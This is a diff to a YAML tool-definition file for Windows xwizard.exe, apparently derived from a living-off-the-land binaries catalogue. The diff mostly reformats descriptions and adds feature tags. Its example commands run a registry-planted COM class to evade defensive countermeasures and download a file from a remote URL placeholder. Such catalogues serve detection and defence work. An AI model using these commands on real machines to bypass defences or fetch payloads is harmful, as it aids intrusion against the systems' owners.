@@ -2,7 +2,8 @@
 id: windows-execution-xwizard
 namespace: windows:execution:xwizard
 name: xwizard
-description: 'Execute custom class that has been added to the registry or download a file with Xwizard.exe Located at: C:\Windows\System32\xwizard.exe; C:\Windows\SysWOW64\xwizard.exe.'
+description: 'Execute custom class that has been added to the registry or download
+  a file with Xwizard.exe Located at: C:\Windows\System32\xwizard.exe; C:\Windows\SysWOW64\xwizard.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -43,7 +44,13 @@ resource_profile:
 allowed-tools:
 - xwizard
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- process-manip
 execution:
   template: xwizard
   sandbox: execFile
@@ -51,11 +58,15 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Xwizard.exe running a custom class that has been added to the registry. (Run a com object created in registry to evade defensive counter measures)
+- description: Xwizard.exe running a custom class that has been added to the registry.
+    (Run a com object created in registry to evade defensive counter measures)
   command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
-- description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds. (Run a com object created in registry to evade defensive counter measures)
+- description: Xwizard.exe running a custom class that has been added to the registry.
+    The /t and /u switch prevent an error message in later Windows 10 builds. (Run
+    a com object created in registry to evade defensive counter measures)
   command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
-- description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache. (Download file from Internet)
+- description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download
+    a file, and save it to INetCache. (Download file from Internet)
   command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
 references:
 - label: ''
@@ -90,7 +101,6 @@ install:
   commands:
   - choco install xwizard
 ---
-
 
 # xwizard
 
